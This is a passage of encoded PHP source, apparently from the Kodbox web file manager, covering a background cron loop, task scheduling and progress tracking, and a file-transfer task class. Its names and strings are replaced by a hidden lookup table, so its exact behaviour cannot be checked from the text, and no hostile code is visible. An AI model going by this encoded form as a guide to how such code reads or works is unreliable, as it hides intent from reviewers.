ÈÚì[839]) != $Ÿô ÈÚì[91]) { self::valueSet($Ÿô ÈÚì[1759], $Ÿô ÈÚì[231]); self::log($Ÿô ÈÚì[1765]); die; } $üæ…¬¼Ô = time(); if ($üæ…¬¼Ô - $›€µ£Æ‹ >= 60) { self::valueSet(array($Ÿô ÈÚì[1759] => $Ÿô ÈÚì[91], $Ÿô ÈÚì[1760] => $üæ…¬¼Ô)); $›€µ£Æ‹ = $üæ…¬¼Ô; } if (!file_exists(USER_SYSTEM . $Ÿô ÈÚì[1766])) { self::valueSet(array($Ÿô ÈÚì[1759] => $Ÿô ÈÚì[231], $Ÿô ÈÚì[839] => $Ÿô ÈÚì[231])); self::log($Ÿô ÈÚì[1767]); die; } $ª¨Ö›É¼ = file_get_contents(BASIC_PATH . $Ÿô ÈÚì[1768]); $Ìõñø¯´ = KOD_VERSION . $Ÿô ÈÚì[10] . KOD_VERSION_BUILD; $«ÈË‰Ìğ = match_text($ª¨Ö›É¼, $Ÿô ÈÚì[1769]) . $Ÿô ÈÚì[10] . match_text($ª¨Ö›É¼, $Ÿô ÈÚì[1770]); if ($«ÈË‰Ìğ != $Ìõñø¯´) { self::restart(); self::log("\163\164\x6f\x70\145\144\56\133\166\145\162\163\x69\157\156\40\x75\x70\x64\x61\x74\x65\73{$versionNow}\40\x3d\x3e\x20{$version}\135"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $¥Î¯Œ…‚ =& $_SERVER[Î·Ü›öğ]; http_close(); $GLOBALS[$¥Î¯Œ…‚[1771]] = 1; $_SERVER[$¥Î¯Œ…‚[1772]] = $¥Î¯Œ…‚[1773]; $_COOKIE = array(); $GLOBALS[$¥Î¯Œ…‚[1774]] = 1; $GLOBALS[$¥Î¯Œ…‚[1775]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $§ÊøìÊ =& $_SERVER[Î·Ü›öğ]; http_close(); self::valueSet($§ÊøìÊ[839], $§ÊøìÊ[231]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($§ÊøìÊ[1759] => $§ÊøìÊ[231], $§ÊøìÊ[839] => $§ÊøìÊ[91])); self::log($§ÊøìÊ[1776]); } public static function taskSwitch() { $‘³è´øĞ =& $_SERVER[Î·Ü›öğ]; $Ò¹’¥óß = self::valueGet($‘³è´øĞ[839]) == $‘³è´øĞ[91] ? $‘³è´øĞ[231] : $‘³è´øĞ[91]; self::valueSet($‘³è´øĞ[839], $Ò¹’¥óß); } public static function shutdownEvent() { $Ò¶’™ =& $_SERVER[Î·Ü›öğ]; self::valueSet($Ò¶’™[1759], $Ò¶’™[231]); self::log($Ò¶’™[1777]); } public static function config($î¶ŒÈÜ‘, $À¡–Ùí„) { self::valueSet($_SERVER[Î·Ü›öğ][839], $î¶ŒÈÜ‘); } private static function taskRunAll() { $ÉŒ×ÉÖ =& $_SERVER[Î·Ü›öğ]; $°µìñƒ­ = timeFloat(); $ºªÖß‹› = Model($ÉŒ×ÉÖ[1778])->listData(); $¾ûÒ†˜– = count($ºªÖß‹›); for ($–·–¹Î = 0; $–·–¹Î < $¾ûÒ†˜–; $–·–¹Î++) { $ù“şü÷´ = $ºªÖß‹›[$–·–¹Î]; if (!$ù“şü÷´[$ÉŒ×ÉÖ[477]] || $ù“şü÷´[$ÉŒ×ÉÖ[1779]] != $ÉŒ×ÉÖ[91]) { continue; } if (!self::taskTimeCheck($ù“şü÷´)) { continue; } self::taskRun($ù“şü÷´); } Hook::trigger($ÉŒ×ÉÖ[1780]); self::taskQueueRun($°µìñƒ­); } private static function taskQueueRun($èš»¥Á) { $ş®šİü = 10; while (!0) { $ûŒ‘ÜÛâ = TaskQueue::run(); if ($ûŒ‘ÜÛâ === !1) { break; } if (timeFloat() - $èš»¥Á >= $ş®šİü) { break; } } } private static function taskTimeCheck($õ–Á£®™) { $¿µİ´± =& $_SERVER[Î·Ü›öğ]; $Œšƒ¿âÕ = json_decode($õ–Á£®™[$¿µİ´±[207]], !0); $Ü ğŒÅÉ = intval($õ–Á£®™[$¿µİ´±[1760]]); $öÁ¦£ù‹ = strtotime($¿µİ´±[1781] . $Œšƒ¿âÕ[$¿µİ´±[1782]] . $¿µİ´±[1783]) - strtotime($¿µİ´±[1784]); $“ÒçŸÄü = time() - strtotime(date($¿µİ´±[1785]) . $¿µİ´±[1786]); $¶ºã¬Ùè = $“ÒçŸÄü >= $öÁ¦£ù‹ && $“ÒçŸÄü <= $öÁ¦£ù‹ + 3600; switch ($Œšƒ¿âÕ[$¿µİ´±[33]]) { case $¿µİ´±[1787]: if (time() - $Ü ğŒÅÉ < 3600 * 24 * 30) { return !1; } if ($Œšƒ¿âÕ[$¿µİ´±[1787]] == date($¿µİ´±[1788]) && $¶ºã¬Ùè) { return !0; } break; case $¿µİ´±[1789]: if (time() - $Ü ğŒÅÉ < 3600 * 24 * 7) { return !1; } $Æåä°œ¿ = date($¿µİ´±[1790]) == 0 ? 7 : date($¿µİ´±[1790]); if ($Œšƒ¿âÕ[$¿µİ´±[1789]] == $Æåä°œ¿ && $¶ºã¬Ùè) { return !0; } break; case $¿µİ´±[1782]: if (time() - $Ü ğŒÅÉ < 3600 * 24) { return !1; } if ($¶ºã¬Ùè) { return !0; } break; case $¿µİ´±[1791]: if (time() - $Ü ğŒÅÉ >= floatval($Œšƒ¿âÕ[$¿µİ´±[1791]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $É¢™ÅñŸ =& $_SERVER[Î·Ü›öğ]; static $˜œ­üß¬ = 0; $ë½Ò®Œ = 300; if (!$˜œ­üß¬) { $˜œ­üß¬ = time(); } if (time() - $˜œ­üß¬ < $ë½Ò®Œ) { return; } $˜œ­üß¬ = time(); $òŸíÍ¨ = Model($É¢™ÅñŸ[590])->db($É¢™ÅñŸ[12]); if ($òŸíÍ¨) { $òŸíÍ¨->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($É¢™ÅñŸ[1792], $É¢™ÅñŸ[1793]); die; } } public static function taskRun($¢àñ¸Š÷) { $÷˜€«£­ =& $_SERVER[Î·Ü›öğ]; self::log($÷˜€«£­[1794] . $¢àñ¸Š÷[$÷˜€«£­[477]] . $÷˜€«£­[1795] . $¢àñ¸Š÷[$÷˜€«£­[32]] . $÷˜€«£­[1796] . $¢àñ¸Š÷[$÷˜€«£­[1797]]); Model($÷˜€«£­[1778])->run($¢àñ¸Š÷[$÷˜€«£­[477]]); $’ØéÓ÷ = timeFloat(); $ ‹üâÓ = $÷˜€«£­[12]; switch ($¢àñ¸Š÷[$÷˜€«£­[33]]) { case $÷˜€«£­[384]: $å™´¢ª = url_request($¢àñ¸Š÷[$÷˜€«£­[1797]], $÷˜€«£­[1533], !1, !1, !1, !1, 10); if ($å™´¢ª[$÷˜€«£­[839]]) { $ ‹üâÓ = strlen($å™´¢ª[$÷˜€«£­[1317]]); } break; case $÷˜€«£­[1798]: $ ‹üâÓ = Hook::apply($¢àñ¸Š÷[$÷˜€«£­[1797]]); default: break; } Model($÷˜€«£­[1799])->add(array($÷˜€«£­[1800] => $÷˜€«£­[12], $÷˜€«£­[1801] => $÷˜€«£­[231], $÷˜€«£­[33] => $÷˜€«£­[1802] . $¢àñ¸Š÷[$÷˜€«£­[477]], $÷˜€«£­[1803] => json_encode(array($÷˜€«£­[32] => $¢àñ¸Š÷[$÷˜€«£­[32]], $÷˜€«£­[1804] => timeFloat() - $’ØéÓ÷, $÷˜€«£­[845] => $ ‹üâÓ)))); $ÖèãøÛÕ = $ ‹üâÓ ? $÷˜€«£­[1805] . $ ‹üâÓ : $÷˜€«£­[12]; self::log($÷˜€«£­[1806] . $¢àñ¸Š÷[$÷˜€«£­[477]] . $÷˜€«£­[178] . $ÖèãøÛÕ); return !0; } public static function valueGet($ç´Î´±À) { $»¶§•“ù =& $_SERVER[Î·Ü›öğ]; $ìç¯ò—¨ = $»¶§•“ù[1807]; $”Ó«îš¦ = Model($»¶§•“ù[519])->get($ç´Î´±À, $ìç¯ò—¨); if (is_null($”Ó«îš¦)) { Model($»¶§•“ù[519])->set($»¶§•“ù[839], $»¶§•“ù[91], $ìç¯ò—¨); Model($»¶§•“ù[519])->set($»¶§•“ù[1759], $»¶§•“ù[231], $ìç¯ò—¨); $”Ó«îš¦ = Model($»¶§•“ù[519])->get($ç´Î´±À, $ìç¯ò—¨); } return $”Ó«îš¦; } private static function valueSet($‰‡×µÍ€, $–É£í‰Å = false) { $×¼¤·»² =& $_SERVER[Î·Ü›öğ]; $Ü‹¡³ôĞ = $×¼¤·»²[1808]; CacheLock::lock($Ü‹¡³ôĞ); $ˆìÖ·ú® = Model($×¼¤·»²[519])->set($‰‡×µÍ€, $–É£í‰Å, $×¼¤·»²[1807]); CacheLock::unlock($Ü‹¡³ôĞ); return $ˆìÖ·ú®; } protected static function log($€àºê£ú) { write_log($€àºê£ú, $_SERVER[Î·Ü›öğ][1793]); } private static function cacheClear() { $ÕØ½ Ğ =& $_SERVER[Î·Ü›öğ]; Cache::clearMemory(Model($ÕØ½ Ğ[519])->cacheKey($ÕØ½ Ğ[1807])); Cache::clearMemory(Model($ÕØ½ Ğ[519])->cacheKey($ÕØ½ Ğ[1809])); Model($ÕØ½ Ğ[1778])->cacheClear(); self::closeDatabase(); } } goto C­Ùô›¾Ó; C­Ùô›¾Ó: class Task { const STATYS_STOP = "\x73\164\157\x70"; const STATYS_RUNNING = "\162\x75\x6e\156\151\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ù¿”ˆª, $úŠ˜¹¶« = '', $êè„¯ = 0, $ıØÍ“õø = '') { $Û»öÅ» =& $_SERVER[Î·Ü›öğ]; if (self::get($ù¿”ˆª)) { return; } $this->task = array($Û»öÅ»[477] => $ù¿”ˆª, $Û»öÅ»[1810] => USER_ID, $Û»öÅ»[1696] => $ıØÍ“õø, $Û»öÅ»[537] => $Û»öÅ»[12], $Û»öÅ»[33] => $úŠ˜¹¶«, $Û»öÅ»[1164] => $Û»öÅ»[12], $Û»öÅ»[1162] => $êè„¯, $Û»öÅ»[1811] => 0, $Û»öÅ»[1812] => 0, $Û»öÅ»[1813] => 0, $Û»öÅ»[1814] => timeFloat(), $Û»öÅ»[1815] => 0, $Û»öÅ»[1816] => 0, $Û»öÅ»[1817] => 0, $Û»öÅ»[1818] => 0, $Û»öÅ»[839] => $Û»öÅ»[1759]); $GLOBALS[$Û»öÅ»[1819]] = 1; Hook::bind($Û»öÅ»[1763], array($this, $Û»öÅ»[1820])); Hook::bind($Û»öÅ»[1821], array($this, $Û»öÅ»[1822])); $this->startAfter(); Hook::trigger($Û»öÅ»[1823], $this->task); $this->task[$Û»öÅ»[1816]] = timeFloat(); } public function end($ŒıĞ¼Ëğ = '') { $ßìç™Î… =& $_SERVER[Î·Ü›öğ]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$ßìç™Î…[1816]]) { self::valueSet($this->task[$ßìç™Î…[477]], !1); } $this->isEnd = !0; if ($ŒıĞ¼Ëğ) { $this->task[$ßìç™Î…[537]] = $ŒıĞ¼Ëğ; } self::log($ßìç™Î…[1824] . $this->task[$ßìç™Î…[477]] . $ßìç™Î…[1825] . sprintf($ßìç™Î…[951], timeFloat() - $this->task[$ßìç™Î…[1814]]) . $ßìç™Î…[1826]); Hook::unbind($ßìç™Î…[1763], array($this, $ßìç™Î…[1820])); Hook::unbind($ßìç™Î…[1821], array($this, $ßìç™Î…[1822])); $this->endAfter(); $ÔÊÄº±« = $this->task; $this->task = !1; Hook::trigger($ßìç™Î…[1827], $ÔÊÄº±«); } public function update($ Ò–Õ‹¯ = 0, $Ïæï•¨  = false) { $À·Ÿ¼’ =& $_SERVER[Î·Ü›öğ]; $“Ë¡—Ş =& $this->task; if (!$“Ë¡—Ş) { return; } $“Ë¡—Ş[$À·Ÿ¼’[1811]] += $ Ò–Õ‹¯; $“Ë¡—Ş[$À·Ÿ¼’[1815]] = timeFloat(); if ($“Ë¡—Ş[$À·Ÿ¼’[1162]]) { if ($“Ë¡—Ş[$À·Ÿ¼’[1162]] < $“Ë¡—Ş[$À·Ÿ¼’[1811]]) { $“Ë¡—Ş[$À·Ÿ¼’[1162]] = $“Ë¡—Ş[$À·Ÿ¼’[1811]]; } $À¬ß”†Ş = timeFloat() - $“Ë¡—Ş[$À·Ÿ¼’[1814]] - $“Ë¡—Ş[$À·Ÿ¼’[1817]]; if ($À¬ß”†Ş <= 0) { $À¬ß”†Ş = 0.001; } $“Ë¡—Ş[$À·Ÿ¼’[1812]] = $“Ë¡—Ş[$À·Ÿ¼’[1811]] / $“Ë¡—Ş[$À·Ÿ¼’[1162]]; $“Ë¡—Ş[$À·Ÿ¼’[1813]] = $“Ë¡—Ş[$À·Ÿ¼’[1811]] / $À¬ß”†Ş; if ($“Ë¡—Ş[$À·Ÿ¼’[1812]] > 0) { $“Ë¡—Ş[$À·Ÿ¼’[1818]] = $À¬ß”†Ş * (1 - $“Ë¡—Ş[$À·Ÿ¼’[1812]]) / $“Ë¡—Ş[$À·Ÿ¼’[1812]]; } $“Ë¡—Ş[$À·Ÿ¼’[1818]] = $“Ë¡—Ş[$À·Ÿ¼’[1818]] <= 0 ? 0 : $“Ë¡—Ş[$À·Ÿ¼’[1818]]; } $this->updateAfter(); $˜Öšú› = 0.2; if (timeFloat() - $“Ë¡—Ş[$À·Ÿ¼’[1816]] < $˜Öšú› && !$Ïæï•¨ ) { return; } $ÇúÉŸÎ = self::get($“Ë¡—Ş[$À·Ÿ¼’[477]]); $Á¤ÎÀŒ = $ÇúÉŸÎ[$À·Ÿ¼’[839]]; if ($Á¤ÎÀŒ == self::STATYS_KILL) { $²‹öã¥“ = array($À·Ÿ¼’[1828] => LNG($À·Ÿ¼’[1829]), $À·Ÿ¼’[1327] => !1); Cache::set($À·Ÿ¼’[1830] . $this->task[$À·Ÿ¼’[477]], $²‹öã¥“, 30); $this->onKill(); $this->end(); die; } else { if ($Á¤ÎÀŒ == self::STATYS_STOP) { $¥…·ŒĞë = 2; $ÇúÉŸÎ[$À·Ÿ¼’[1817]] += $¥…·ŒĞë; self::valueSet($“Ë¡—Ş[$À·Ÿ¼’[477]], $ÇúÉŸÎ); sleep($¥…·ŒĞë); $this->update(); return; } } $“Ë¡—Ş[$À·Ÿ¼’[839]] = $Á¤ÎÀŒ ? $Á¤ÎÀŒ : $“Ë¡—Ş[$À·Ÿ¼’[839]]; $“Ë¡—Ş[$À·Ÿ¼’[1817]] = $ÇúÉŸÎ[$À·Ÿ¼’[1817]] ? $ÇúÉŸÎ[$À·Ÿ¼’[1817]] : 0; $“Ë¡—Ş[$À·Ÿ¼’[1816]] = timeFloat(); Hook::trigger($À·Ÿ¼’[1831], $“Ë¡—Ş); self::valueSet($“Ë¡—Ş[$À·Ÿ¼’[477]], $“Ë¡—Ş); } public function onKillSet($è¾ ½Ú, $ª¡é™šç = array()) { $this->onKillCall = array($è¾ ½Ú, $ª¡é™šç); } public function onKill() { $‘€ò¤ôÙ =& $_SERVER[Î·Ü›öğ]; self::log($‘€ò¤ôÙ[1824] . $this->task[$‘€ò¤ôÙ[477]] . $‘€ò¤ôÙ[1832]); Hook::trigger($‘€ò¤ôÙ[1833], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($õş”“¢ä) { $Ñ ’àêö =& $_SERVER[Î·Ü›öğ]; Cache::set($Ñ ’àêö[1830] . $this->task[$Ñ ’àêö[477]], $õş”“¢ä, 60); if (!is_array($õş”“¢ä) || !$õş”“¢ä[$Ñ ’àêö[1327]]) { self::log($Ñ ’àêö[1834] . json_encode($õş”“¢ä)); } return $õş”“¢ä; } public static function get($±»ˆÕµ“) { $¶ÌÑ•äÊ =& $_SERVER[Î·Ü›öğ]; $¹»¥ëú´ = self::valueGet($±»ˆÕµ“); if (is_array($¹»¥ëú´) && $¹»¥ëú´[$¶ÌÑ•äÊ[1835]]) { $öù×¦¨Ø = ActionApply($¹»¥ëú´[$¶ÌÑ•äÊ[1835]], array($¹»¥ëú´)); $¹»¥ëú´ = is_array($öù×¦¨Ø) ? $öù×¦¨Ø : $¹»¥ëú´; } return $¹»¥ëú´; } public static function listData() { $ÅìÉòŸ† = self::valueGet(); return array_sort_by($ÅìÉòŸ†, $_SERVER[Î·Ü›öğ][1814], !0); } public static function kill($€¹ÛÖ”›) { return self::changeStatus($€¹ÛÖ”›, self::STATYS_KILL); } public static function stop($æÑÙÑ‘) { return self::changeStatus($æÑÙÑ‘, self::STATYS_STOP); } public static function restart($ìà€šÎ) { return self::changeStatus($ìà€šÎ, self::STATYS_RUNNING); } public static function killAll() { $”ÄÓ•Ó =& $_SERVER[Î·Ü›öğ]; $¶ïÆ¥Ô‡ = self::listData(); foreach ($¶ïÆ¥Ô‡ as $êÙ’™ìµ) { self::kill($êÙ’™ìµ[$”ÄÓ•Ó[477]]); } sleep(2); foreach ($¶ïÆ¥Ô‡ as $êÙ’™ìµ) { self::valueSet($êÙ’™ìµ[$”ÄÓ•Ó[477]], !1); } } private static function changeStatus($·‹Æáé¬, $ğËë†°Ã) { $Ö´¯„¼… =& $_SERVER[Î·Ü›öğ]; $™ ‚³œ’ = self::valueGet($·‹Æáé¬); if (!$™ ‚³œ’) { return !1; } $™ ‚³œ’[$Ö´¯„¼…[839]] = $ğËë†°Ã; self::valueSet($·‹Æáé¬, $™ ‚³œ’); self::log($Ö´¯„¼…[1836] . $™ ‚³œ’[$Ö´¯„¼…[477]] . $Ö´¯„¼…[1837] . $ğËë†°Ã); return !0; } public static function valueGet($ÃöêÊªØ = false) { $Å¡ÓÂİÈ =& $_SERVER[Î·Ü›öğ]; if ($ÃöêÊªØ) { $–ïÏİ±Ö = Model($Å¡ÓÂİÈ[531])->where(array($Å¡ÓÂİÈ[97] => $ÃöêÊªØ, $Å¡ÓÂİÈ[33] => $Å¡ÓÂİÈ[1171]))->find(); return $–ïÏİ±Ö ? json_decode($–ïÏİ±Ö[$Å¡ÓÂİÈ[452]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Åä™ ø = false) { $ûó©Á‘ò =& $_SERVER[Î·Ü›öğ]; $ıÂÍŠô· = array($ûó©Á‘ò[33] => $ûó©Á‘ò[1171]); if ($Åä™ ø) { $ıÂÍŠô·[$ûó©Á‘ò[1810]] = $Åä™ ø; } $–¬×ú¦Ï = Model($ûó©Á‘ò[531])->where($ıÂÍŠô·)->select(); $–¬×ú¦Ï = $–¬×ú¦Ï ? $–¬×ú¦Ï : array(); foreach ($–¬×ú¦Ï as $°¨†¼ï => $İçÌ¤©ó) { $–¬×ú¦Ï[$°¨†¼ï] = json_decode($İçÌ¤©ó[$ûó©Á‘ò[452]], !0); } return $–¬×ú¦Ï; } public static function valueSet($¸Ï¨©á‚, $÷¶«İœ) { $ıåÙŸŒ =& $_SERVER[Î·Ü›öğ]; if (!$÷¶«İœ) { return Model($ıåÙŸŒ[531])->where(array($ıåÙŸŒ[97] => $¸Ï¨©á‚, $ıåÙŸŒ[33] => $ıåÙŸŒ[1171]))->delete(); } $é·ÌÜƒ® = json_encode($÷¶«İœ); if (!$é·ÌÜƒ®) { ob_start(); var_dump($÷¶«İœ); $ë®™û³‰ = ob_get_clean(); self::log($ıåÙŸŒ[1838] . json_encode_force($ë®™û³‰)); } if (!$¸Ï¨©á‚ || !$÷¶«İœ[$ıåÙŸŒ[477]]) { return !1; } $˜Üş«½İ = array($ıåÙŸŒ[33] => $ıåÙŸŒ[1171], $ıåÙŸŒ[1810] => USER_ID, $ıåÙŸŒ[97] => $¸Ï¨©á‚, $ıåÙŸŒ[452] => $é·ÌÜƒ®); $ß´Á¼õ‘ = $ıåÙŸŒ[1839]; CacheLock::lock($ß´Á¼õ‘); Model($ıåÙŸŒ[531])->add($˜Üş«½İ, array(), !0); CacheLock::unlock($ß´Á¼õ‘); } public static function log($îó°‹Ï¤) { if (!GLOBAL_DEBUG) { return; } write_log($îó°‹Ï¤, $_SERVER[Î·Ü›öğ][1840]); } } class TaskFileTransfer extends Task { protected function startAfter() { $ŸºÇªœä =& $_SERVER[Î·Ü›öğ]; $Á ´»Î =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($ŸºÇªœä[1841], array($this, $ŸºÇªœä[1842])); Hook::bind($ŸºÇªœä[1338], array($this, $ŸºÇªœä[1843])); Hook::bind($ŸºÇªœä[1844], array($this, $ŸºÇªœä[1845])); Hook::bind($ŸºÇªœä[684], array($this, $ŸºÇªœä[1846])); Hook::bind($ŸºÇªœä[685], array($this, $ŸºÇªœä[1847])); Hook::bind($ŸºÇªœä[691], array($this, $ŸºÇªœä[1848])); Hook::bind($ŸºÇªœä[692], array($this, $ŸºÇªœä[1849])); Hook::bind($ŸºÇªœä[687], array($this, $ŸºÇªœä[1850])); Hook::bind($ŸºÇªœä[689], array($this, $ŸºÇªœä[1851])); Hook::bind($ŸºÇªœä[653], array($this, $ŸºÇªœä[1852])); Hook::bind($ŸºÇªœä[650], array($this, $ŸºÇªœä[1852])); Hook::bind($ŸºÇªœä[655], array($this, $ŸºÇªœä[1852])); Hook::bind($ŸºÇªœä[657], array($this, $ŸºÇªœä[1852])); Hook::bind($ŸºÇªœä[659], array($this, $ŸºÇªœä[1852])); Hook::bind($ŸºÇªœä[1853], array($this, $ŸºÇªœä[1854])); Hook::bind($ŸºÇªœä[675], array($this, $ŸºÇªœä[1855])); $this->sourceModelCopyFlag = !1; Hook::bind($ŸºÇªœä[1856], array($this, $ŸºÇªœä[1857])); Hook::bind($ŸºÇªœä[1858], array($this, $ŸºÇªœä[1859])); Hook::bind($ŸºÇªœä[1860], array($this, $ŸºÇªœä[1861])); $Á ´»Î[$ŸºÇªœä[1862]] = LNG($ŸºÇªœä[1863]); $Á ´»Î[$ŸºÇªœä[1864]] = 0; $Á ´»Î[$ŸºÇªœä[1865]] = 0; $Á ´»Î[$ŸºÇªœä[1164]] = $ŸºÇªœä[12]; $Á ´»Î[$ŸºÇªœä[1866]] = $ŸºÇªœä[12]; $Á ´»Î[$ŸºÇªœä[1867]] = 0; $Á ´»Î[$ŸºÇªœä[1868]] = 0; $Á ´»Î[$ŸºÇªœä[1869]] = 0; if (!$Á ´»Î[$ŸºÇªœä[1696]]) { $Á ´»Î[$ŸºÇªœä[1696]] = LNG($ŸºÇªœä[1870]); } } protected function endAfter() { $µ›×·Êë =& $_SERVER[Î·Ü›öğ]; Hook::unbind($µ›×·Êë[1841], array($this, $µ›×·Êë[1842])); Hook::unbind($µ›×·Êë[1338], array($this, $µ›×·Êë[1843])); Hook::unbind($µ›×·Êë[1844], array($this, $µ›×·Êë[1845])); Hook::unbind($µ›×·Êë[684], array($this, $µ›×·Êë[1846])); Hook::unbind($µ›×·Êë[685], array($this, $µ›×·Êë[1847])); Hook::unbind($µ›×·Êë[691], array($this, $µ›×·Êë[1848])); Hook::unbind($µ›×·Êë[692], array($this, $µ›×·Êë[1849])); Hook::unbind($µ›×·Êë[687], array($this, $µ›×·Êë[1850])); Hook::unbind($µ›×·Êë[689], array($this, $µ›×·Êë[1851])); Hook::unbind($µ›×·Êë[653], array($this, $µ›×·Êë[1852])); Hook::unbind($µ›×·Êë[650], array($this, $µ›×·Êë[1852])); Hook::unbind($µ›×·Êë[655], array($this, $µ›×·Êë[1852])); Hook::unbind($µ›×·Êë[657], array($this, $µ›×·Êë[1852])); Hook::unbind($µ›×·Êë[659], array($this, $µ›×·Êë[1852])); Hook::unbind($µ›×·Êë[1853], array($this, $µ›×·Êë[1854])); Hook::unbind($µ›×·Êë[675], array($this, $µ›×·Êë[1855])); Hook::unbind($µ›×·Êë[1856], array($this, $µ›×·Êë[1857])); Hook::unbind($µ›×·Êë[1858], array($this, $µ›×·Êë[1859])); Hook::unbind($µ›×·Êë[1860], array($this, $µ›×·Êë[1861])); } public function copyMoveStart($®øö‰½å, $ÉÌÚ°è†, $¬Ó½ŞÙ“, $Á›ë´Œ´) { $áŸæ¿— =& $_SERVER[Î·Ü›öğ]; self::log($áŸæ¿—[1871] . $ÉÌÚ°è† . $áŸæ¿—[73] . $Á›ë´Œ´); $ü÷ƒÍèà = rtrim(TEMP_FILES, $áŸæ¿—[8]); if (substr($ÉÌÚ°è†, 0, strlen($ü÷ƒÍèà)) == $ü÷ƒÍèà) { return; } if (substr($Á›ë´Œ´, 0, strlen($ü÷ƒÍèà)) == $ü÷ƒÍèà) { return; } $ï¶ğ¯Ç =& $this->task; $ï¶ğ¯Ç[$áŸæ¿—[1872]] = KodIO::transferType($®øö‰½å, $¬Ó½ŞÙ“); $this->update(); } public function updateAfter() { $ïÙ¶óïŞ =& $_SERVER[Î·Ü›öğ]; $àŒÉ·éı =& $this->task; if (!$àŒÉ·éı[$ïÙ¶óïŞ[853]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($àŒÉ·éı[$ïÙ¶óïŞ[1872]] == $ïÙ¶óïŞ[1439]) { return; } self::updateTask($àŒÉ·éı); } private static function updateTask(&$¹×œ¼çÅ) { $ºĞ‹Öš½ =& $_SERVER[Î·Ü›öğ]; if ($¹×œ¼çÅ[$ºĞ‹Öš½[1872]] == $ºĞ‹Öš½[1309] || $¹×œ¼çÅ[$ºĞ‹Öš½[1872]] == $ºĞ‹Öš½[110]) { if ($¹×œ¼çÅ[$ºĞ‹Öš½[1866]]) { $¹×œ¼çÅ[$ºĞ‹Öš½[1869]] = $¹×œ¼çÅ[$ºĞ‹Öš½[1868]] + $¹×œ¼çÅ[$ºĞ‹Öš½[1865]]; } } else { if ($¹×œ¼çÅ[$ºĞ‹Öš½[1872]] == $ºĞ‹Öš½[1440]) { if ($¹×œ¼çÅ[$ºĞ‹Öš½[1866]] == $ºĞ‹Öš½[1309]) { $¹×œ¼çÅ[$ºĞ‹Öš½[1869]] = $¹×œ¼çÅ[$ºĞ‹Öš½[1868]] + $¹×œ¼çÅ[$ºĞ‹Öš½[1865]] * 0.5; } else { if ($¹×œ¼çÅ[$ºĞ‹Öš½[1866]] == $ºĞ‹Öš½[110]) { $¹×œ¼çÅ[$ºĞ‹Öš½[1869]] = $¹×œ¼çÅ[$ºĞ‹Öš½[1868]] + $¹×œ¼çÅ[$ºĞ‹Öš½[1864]] * 0.5 + $¹×œ¼çÅ[$ºĞ‹Öš½[1865]] * 0.5; } } } } $¹×œ¼çÅ[$ºĞ‹Öš½[1812]] = $¹×œ¼çÅ[$ºĞ‹Öš½[1869]] / $¹×œ¼çÅ[$ºĞ‹Öš½[853]]; if ($¹×œ¼çÅ[$ºĞ‹Öš½[1812]] > 0) { $ôé¶ûÌ = timeFloat() - $¹×œ¼çÅ[$ºĞ‹Öš½[1814]] - $¹×œ¼çÅ[$ºĞ‹Öš½[1817]]; $¹×œ¼çÅ[$ºĞ‹Öš½[1818]] = $ôé¶ûÌ * (1 - $¹×œ¼çÅ[$ºĞ‹Öš½[1812]]) / $¹×œ¼çÅ[$ºĞ‹Öš½[1812]]; } } public function addPath($¼Ïœ£µ¥) { $’óÎï¬Ô =& $_SERVER[Î·Ü›öğ]; if (!$¼Ïœ£µ¥) { return; } $Óå¼ºÀí =& $this->task; $Ë¡¼óâ³ = IO::infoWithChildren($¼Ïœ£µ¥); $Öå‰ƒ¯ü = $Óå¼ºÀí[$’óÎï¬Ô[1873]] ? $Óå¼ºÀí[$’óÎï¬Ô[1873]][$’óÎï¬Ô[1874]] : 0; $Óå¼ºÀí[$’óÎï¬Ô[1873]] = array($’óÎï¬Ô[1874] => $Öå‰ƒ¯ü + 1, $’óÎï¬Ô[505] => $Ë¡¼óâ³[$’óÎï¬Ô[32]], $’óÎï¬Ô[87] => $Ë¡¼óâ³[$’óÎï¬Ô[87]], $’óÎï¬Ô[595] => $Ë¡¼óâ³[$’óÎï¬Ô[595]] ? $Ë¡¼óâ³[$’óÎï¬Ô[595]] : $Ë¡¼óâ³[$’óÎï¬Ô[87]]); if ($Ë¡¼óâ³[$’óÎï¬Ô[33]] == $’óÎï¬Ô[233]) { $Óå¼ºÀí[$’óÎï¬Ô[1162]] += 1; } else { $Óå¼ºÀí[$’óÎï¬Ô[1162]] += $Ë¡¼óâ³[$’óÎï¬Ô[82]][$’óÎï¬Ô[80]]; if ($Ë¡¼óâ³[$’óÎï¬Ô[194]]) { $Óå¼ºÀí[$’óÎï¬Ô[1162]] += $Ë¡¼óâ³[$’óÎï¬Ô[82]][$’óÎï¬Ô[81]] + 1; } } $Óå¼ºÀí[$’óÎï¬Ô[853]] += $Ë¡¼óâ³[$’óÎï¬Ô[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($Í¾Ì­ô„) { } public function sourceAddHashEnd($ç°¢¿) { } public function sourceAddFileStart($ë¦ÅœÕÓ) { $®öà¨ç¸ =& $_SERVER[Î·Ü›öğ]; $”“½šÃ =& $this->task; $”“½šÃ[$®öà¨ç¸[1864]] = $ë¦ÅœÕÓ[$®öà¨ç¸[79]]; $”“½šÃ[$®öà¨ç¸[1862]] = $ë¦ÅœÕÓ[$®öà¨ç¸[32]]; $”“½šÃ[$®öà¨ç¸[1164]] = $ë¦ÅœÕÓ[$®öà¨ç¸[32]]; $”“½šÃ[$®öà¨ç¸[1875]] = $ë¦ÅœÕÓ[$®öà¨ç¸[87]]; $this->update(); } public function sourceAddFileEnd($Û‹ÀûÂ—) { $®£úŒÃı =& $_SERVER[Î·Ü›öğ]; $¼¼Æ©Ëñ =& $this->task; 